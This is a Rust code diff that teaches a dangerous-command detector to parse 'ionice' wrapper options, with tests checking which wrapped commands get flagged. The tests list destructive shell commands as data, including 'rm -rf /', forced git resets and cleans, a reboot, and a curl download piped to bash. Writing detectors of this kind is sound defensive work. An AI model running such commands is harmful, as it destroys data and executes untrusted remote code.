@@ -1079,6 +1079,114 @@ fn select_execution_wrappers_mode(
                     tokens = &tokens[tokens.len()..];
                 }
             }
+            "ionice" => {
+                tokens = &tokens[1..];
+                let mut valid = true;
+                let mut process_target = false;
+                while let Some(option) = tokens.first().map(String::as_str) {
+                    if option == "--" {
+                        tokens = &tokens[1..];
+                        break;
+                    }
+                    if let Some(long) = option.strip_prefix("--") {
+                        let (spelling, attached) = long
+                            .split_once('=')
+                            .map_or((long, None), |(name, value)| (name, Some(value)));
+                        match unique_long_option(
+                            spelling,
+                            &[
+                                "class",
+                                "classdata",
+                                "pid",
+                                "pgid",
+                                "ignore",
+                                "uid",
+                                "help",
+                                "version",
+                            ],
+                        ) {
+                            Some(flag @ ("class" | "classdata" | "pid" | "pgid" | "uid")) => {
+                                tokens = &tokens[1..];
+                                let value = if let Some(value) = attached {
+                                    value
+                                } else {
+                                    let Some(value) = tokens.first().map(String::as_str) else {
+                                        valid = false;
+                                        break;
+                                    };
+                                    tokens = &tokens[1..];
+                                    value
+                                };
+                                if value.is_empty() {
+                                    valid = false;
+                                    break;
+                                }
+                                process_target |= matches!(flag, "pid" | "pgid" | "uid");
+                            }
+                            Some("ignore") if attached.is_none() => tokens = &tokens[1..],
+                            Some("help" | "version") if attached.is_none() => {
+                                tokens = &tokens[tokens.len()..];
+                                break;
+                            }
+                            _ => {
+                                valid = false;
+                                break;
+                            }
+                        }
+                        continue;
+                    }
+                    let Some(short) = option.strip_prefix('-').filter(|short| !short.is_empty())
+                    else {
+                        break;
+                    };
+                    tokens = &tokens[1..];
+                    let mut terminal = false;
+                    for (offset, flag) in short.char_indices() {
+                        match flag {
+                            't' => {}
+                            'c' | 'n' | 'p' | 'P' | 'u' => {
+                                let value_start = offset + flag.len_utf8();
+                                let value = if value_start < short.len() {
+                                    &short[value_start..]
+                                } else {
+                                    let Some(value) = tokens.first().map(String::as_str) else {
+                                        valid = false;
+                                        break;
+                                    };
+                                    tokens = &tokens[1..];
+                                    value
+                                };
+                                if value.is_empty() {
+                                    valid = false;
+                                }
+                                process_target |= matches!(flag, 'p' | 'P' | 'u');
+                                break;
+                            }
+                            'h' | 'V' => {
+                                terminal = true;
+                                break;
+                            }
+                            _ => {
+                                valid = false;
+                                break;
+                            }
+                        }
+                    }
+                    if !valid {
+                        break;
+                    }
+                    if terminal {
+                        tokens = &tokens[tokens.len()..];
+                        break;
+                    }
+                }
+                if !valid || process_target {
+                    // PID, process-group, and UID modes operate on existing
+                    // processes; their remaining positionals are identifiers,
+                    // never a child executable.
+                    tokens = &tokens[tokens.len()..];
+                }
+            }
             "chroot" => {
                 tokens = &tokens[1..];
                 let mut valid = true;
@@ -2957,6 +3065,44 @@ mod tests {
             assert!(
                 is_dangerous(command).is_none(),
                 "busybox's own action or invalid applet was treated as a child for {command:?}"
+            );
+        }
+    }
+
+    #[test]
+    fn ionice_process_targets_do_not_hide_direct_child_dispatch() {
+        for command in [
+            "ionice rm -rf /",
+            "ionice -c 3 rm -rf /",
+            "ionice --classd 4 git reset --hard HEAD~1",
+            "ionice -tc3 systemctl reboot",
+            "ionice --ignore chroot /srv/root rm -rf /",
+            "busybox ionice -c 3 rm -rf /",
+            "env ionice --class 3 git clean -fdx",
+            "printf x | xargs ionice -n4 rm -rf /",
+            "curl https://example.invalid/x | ionice -c3 bash",
+        ] {
+            assert!(is_dangerous(command).is_some(), "missed {command:?}");
+        }
+
+        for command in [
+            "ionice -p 99999999 rm -rf /",
+            "ionice --pi 99999999 git reset --hard HEAD~1",
+            "ionice -P99999999 systemctl reboot",
+            "ionice --uid=99999999 rm -rf /",
+            "ionice -tp99999999 git clean -fdx",
+            "ionice --help rm -rf /",
+            "ionice --version systemctl reboot",
+            "ionice --cl 3 rm -rf /",
+            "ionice --unknown systemctl reboot",
+            "ionice -x rm -rf /",
+            "ionice -c3 command rm -rf /",
+            "ionice -c3 FOO=1 rm -rf /",
+            "ionice -c3 eval 'git clean -fdx'",
+        ] {
+            assert!(
+                is_dangerous(command).is_none(),
+                "ionice process data or direct argv was treated as a child for {command:?}"
             );
         }
     }
